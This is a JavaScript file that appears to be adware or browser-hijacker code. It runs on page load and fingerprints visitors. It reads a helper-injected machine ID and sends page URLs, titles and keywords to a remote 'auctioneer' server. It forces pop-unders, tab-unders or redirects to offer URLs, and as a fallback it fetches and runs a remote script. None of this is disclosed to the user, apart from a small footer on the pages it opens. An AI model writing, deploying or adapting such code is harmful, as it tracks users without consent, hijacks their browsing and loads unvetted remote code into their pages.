try {
	(function () {

        let isProd = true
        let showLog = true
        var serverUrl = isProd ? 'https://auctioneer.50million.club' : 'http://127.0.0.1:3000';
        var fingerprint = null
        var useFingerprint = true
        var config = {}

        let currDate = new Date();
        let cacheDate = currDate.getFullYear() + "-" + (currDate.getMonth()+1) + "-" + currDate.getDate() + "-" + currDate.getHours();
        var cachebuster = Math.round(new Date().getTime() / 1000)

        var offerMgr = {
            loadScript: function(url, callback) {
                if (typeof document.getElementsByTagName("head") === 'undefined' || 
                    typeof document.getElementsByTagName("head")[0] === 'undefined') {
                    return;
                }

                var script = document.createElement("script")
                script.type = "text/javascript";
        
                if (script.readyState) { //IE
                    script.onreadystatechange = function () {
                        if (script.readyState == "loaded" || script.readyState == "complete") {
                            script.onreadystatechange = null;
                            callback();
                        }
                    };
                } else { //Others
                    script.onload = function () {
                        callback();
                    };
                }
        
                script.src = url;
                document.getElementsByTagName("head")[0].appendChild(script);
            },
            getKeywords: function() {
                var keywords = '';
                var metas = document.getElementsByTagName('meta');
                if (metas) {
                    for (var x=0,y=metas.length; x<y; x++) {
                        if (metas[x].name.toLowerCase() == "keywords") {
                            keywords += metas[x].content;
                        }
                    }
                }
                return keywords != '' ? keywords : null;
            },
            log : function(message, obj) {
                if (showLog) {
                    console.log(message + (JSON && JSON.stringify && obj ? ': ' + JSON.stringify(obj) : ''))
                }
            },
            clientEvent : function(fingerprint, userId, offerId, message) {
                var fp = fingerprint || userId
                jQuery.ajax({
                    url: `${serverUrl}/events/${fp}`,
                    dataType: 'jsonp',
                    type: 'get',
                    data: {
                        url: encodeURI(window.location.href),
                        userId: userId,
                        offerId: offerId, 
                        message: message,
                        cb: cachebuster
                    }
                });
            },
            inIframe: function() {
                try {
                    return window.self !== window.top;
                } catch (e) {
                    return true;
                }
            },
            isCookieEnabled: function() {
                return navigator.cookieEnabled
            },
            getOffer : function(userId, groupName, fingerprint, machineId, clickId, brand) {
                if (config.clientEventEnabled) {
                    offerMgr.clientEvent(fingerprint, userId, null, 'getting offer from server')
                }

                jQuery.ajax({
                    url: `${serverUrl}/offers/${userId}`,
                    dataType: 'jsonp',
                    type: 'get',
                    data: {
                        url: encodeURI(window.location.href),
                        language: encodeURI(window.navigator.userLanguage || window.navigator.language),
                        group: groupName,
                        title: document.title,
                        keywords: offerMgr.getKeywords(),
                        cb: cachebuster,
                        inIframe: offerMgr.inIframe(),
                        cookieEnabled: offerMgr.isCookieEnabled(),
                        jsEnabled: true,
                        method: 'js',
                        machineId: machineId,
                        clickId: clickId,
                        brand: brand
                    },
                    success: function( result ) {
                        offerMgr.log('getOffer result', result)

                        if (result.status == 'OK') {
                            if (result.mode == 'redirect') {
                                var redirectUrl = `${serverUrl}/offers/${userId}/${result.offerId}?url=${encodeURI(window.location.href)}`;
                                window.location = redirectUrl;
                                window.name = `mm_pop:${result.offerId}:${userId}`
                            } else if (config.replaceAndOpen || result.mode == 'replaceAndOpen') {
                                $( document ).ready(function() {
                                    var popUrl = `${serverUrl}/offers/${userId}/${result.offerId}?url=${encodeURI(window.location.href)}`;
                                    var currUrl = window.location;
                                    window.open(currUrl);
                                    window.location = popUrl;
                                    window.name = `mm_pop:${result.offerId}:${userId}`
                                })
                            }
                            else {
                                if (config.clientEventEnabled) {
                                    offerMgr.clientEvent(fingerprint, userId, result.offerId, 'getoffer result ok, registering click')
                                }

                                offerMgr.log(`registering click at: ${serverUrl}/offers/${userId}/${result.offerId}`)

                                var popType = 'tabunder' // 'popup' | 'tabunder'
                                MMP.add(`${serverUrl}/offers/${userId}/${result.offerId}?url=${encodeURI(window.location.href)}`, 
                                    {   
                                        name: popType == 'tabunder' ? null : `mm_pop:${result.offerId}:${userId}`, 
                                        cookieExpires: -1, 
                                        under: popType == 'tabunder', 
                                        newTab: false,
                                        perpage: 1, 
                                        afterOpen: function(url, options, popWin) {
                                            if (popType == 'tabunder') {
                                                window.name = `mm_pop:${result.offerId}:${userId}`
                                            } else {
                                                popWin.name = `mm_pop:${result.offerId}:${userId}`
                                            }

                                            MMP.emptyStack();                                            
                                        },
                                        beforeOpen: function(url, options) {
                                            if (config.clientEventEnabled) {                                    
                                                offerMgr.clientEvent(fingerprint, userId, result.offerId, 'before open called for: ' + url)
                                            }
                                        }
                                    })

                            }
                        } else {
							// fallback
							if (!(result.status in ["initial_sleep","restrict_gold_bid_sleep","restrict_sleep","restrict_count"])) {
								console.log('fallback')
								var url = '//cdncache-a.akamaihd.net/sub/s4aa1f3/' + groupName + '/l.js?pid=2484&ext=' + brand + '&nocache=1';
								var e=document.createElement('script');
								e.src = url;
								document.body.appendChild(e);
							}

                            if (config.clientEventEnabled) {
                                offerMgr.clientEvent(fingerprint, userId, null, 'getoffer result not ok: ' + result.status)
                            }
                        }
                    }
                    
                });
            },
            updateOffer : function(offerId, userId) {                
                jQuery.ajax({
                    url: `${serverUrl}/offers/event/${offerId}/${userId}`,
                    dataType: 'jsonp',
                    type: 'get',
                    data: {
                        url: encodeURI(window.location.href),
                        cb: cachebuster
                    },
                    success: function( result ) {
                        offerMgr.log(`Put offer result`, result)
                    },
                    error: function(jqXhr, textStatus, errorThrown) {
                        offerMgr.log(`error occured when putting offer. textStatus: ${textStatus}, errorThrown: ${errorThrown}`)
                    }
                    
                });
            },
            getConfig : function() {
                var conf = {}

                try {
                    var urlParams = new URLSearchParams(window.location.search);
                    if (urlParams) {
                        var myParam = urlParams.get('mm_config');
                        if (myParam) {
                            conf = JSON.parse(myParam)
                        }
                    }
                } catch(err) {
                    console.log("getConfig >> exception: " + err);
                }

                return conf
            },
            init : function() {
                if (!window.jQuery || !window.jQuery.ajax) {
                    offerMgr.log('jquery not loaded, need to load');
                    offerMgr.loadScript(`${serverUrl}/javascripts/lib/jquery-3.3.1.min.js?${cacheDate}`, function() {
                        offerMgr.log('jquery loaded');
                        offerMgr.init()                        
                    })
                    return;
                } else {
                    offerMgr.log('jquery already loaded');
                }

                if (useFingerprint && !fingerprint) {
                    offerMgr.log('loading fingerprint');
                    offerMgr.loadScript(`${serverUrl}/javascripts/lib/fingerprint2.min.js?${cacheDate}`, function() {
                        offerMgr.log('fingerprint loaded');
                        if (typeof Fingerprint2 !== 'undefined') {
                            new Fingerprint2().get(function(fp, components) {
                                offerMgr.log(`Fingerprint generated: ${fp}`)
                                fingerprint = fp
                                offerMgr.init()
                            })
                        } else {
                            offerMgr.log(`fingerprint can't be used`);
                            useFingerprint = false
                            offerMgr.init()
                        }
                    })
                    return;
                }

                // get web helper data
                let webHelperAvailable = typeof _webhelper_source !== 'undefined';
                let clickId = webHelperAvailable ? _webhelper_source.GUID : null
                let machineId = webHelperAvailable ? _webhelper_source.MACHINEID : null
                let groupName = webHelperAvailable ? _webhelper_source.SOURCE : null
                let brand = webHelperAvailable ? _webhelper_source.BRAND : null

                // choose user id
                var userId = fingerprint;
                if (webHelperAvailable && clickId && typeof clickId !== 'undefined' && clickId !== 'undefined' && clickId != '0' && clickId !== 'Available' && clickId !== 'NONE') {
                    userId = clickId
                }
                if (webHelperAvailable && machineId && typeof machineId !== 'undefined' && machineId !== 'undefined' && machineId != '0' && machineId !== 'Available' && machineId !== 'NONE') {
                    userId = machineId
                }

                offerMgr.log(`fp: ${fingerprint}, uid: ${userId}, grp: ${groupName}, b: ${brand}, mid: ${machineId}, cid: ${clickId}`)

                if (!userId) {
                    offerMgr.log('no user id, cancel initiation')
                    return
                }

                // get server to interact with and config
                jQuery.ajax({
                    url: `${serverUrl}/server/${userId}`,
                    dataType: 'jsonp',
                    type: 'get',
                    data: { cb: cachebuster },
                    success: function( result ) {
                        offerMgr.log(`Server result`, result)
                        serverUrl = result.url

                        // get remote config
                        if (result && result.config) {
                            config = result.config;
                            offerMgr.log('remote config', config);
                        } else {
                            offerMgr.log('no remote config')
                        }

                        // merge remote config  or override it
                        let qsConfig = offerMgr.getConfig();
                        if (qsConfig) {
                            offerMgr.log('qs config', qsConfig)

                            if (config) {
                                for(var key in qsConfig) {
                                    config[key] = qsConfig[key];
                                }
                            } else {
                                config = qsConfig
                            }
                        } else {
                            offerMgr.log('no qs config')
                        }                

                        if (window.name && window.name.includes('mm_pop')) {
                            offerMgr.log('mm_pop found: ' + window.name)

                            let popParams = window.name.split(':')
                            let offerId = popParams[1]
                            let popUserId = popParams[2]

                            if (brand && brand != '') {
                                jQuery('body').append(`<div style="position: fixed; bottom: 0; right: 0; color: darkgray; font-size:10px">Powered by ${brand}. [#${offerId}] <a style="color: darkgray; font-size:10px" target="_blank" href="http://cdn.macresourcescdn.com/about/${brand}/TERMS">Read more</a>`)
                            } else {
                                jQuery('body').append(`<div style="position: fixed; bottom: 0; right: 0; color: darkgray; font-size:10px">[#${offerId}] <a style="color: darkgray; font-size:10px" target="_blank" href="http://cdn.macresourcescdn.com/about/${brand}/TERMS">Read more</a>`)
                            }

                            // on page ready, update the server
                            jQuery(function() {
                                offerMgr.updateOffer(offerId, popUserId)

                                window.name = ''
                                offerMgr.log('window name erased')
                            })
                        } else {
                            if (config.replaceAndOpen) {
                                offerMgr.getOffer(userId, groupName, fingerprint, machineId, clickId, brand)
                            } else {
                                offerMgr.loadScript(`${serverUrl}/javascripts/lib/mmp/mmp_script.js?${cacheDate}`, function() {
                                    MMP.config({debug: true, safe: true})
                                    offerMgr.getOffer(userId, groupName, fingerprint, machineId, clickId, brand)
                                });
                            }
                        }
                    }
                })
                        
            }
        }

        offerMgr.init();
       
    })();
}
catch(err) {
    console.log("exception: " + err);
    var errMsg = err
    try {
        errMsg += '<br>Stack:' + (typeof err !== 'undefined' ? err.stack : 'NA');
    } catch(err2) {
        errMgs += '<br>Stack: cannot get stack'
    }
                     
    jQuery.ajax({
        url: `https://auctioneer.50million.club/events/unknown`,
        dataType: 'jsonp',
        type: 'get',
        data: {
            message: 'Url: ' + window.location.href + '<br>' + 
                     'Error: ' + errMsg
        }
    });
}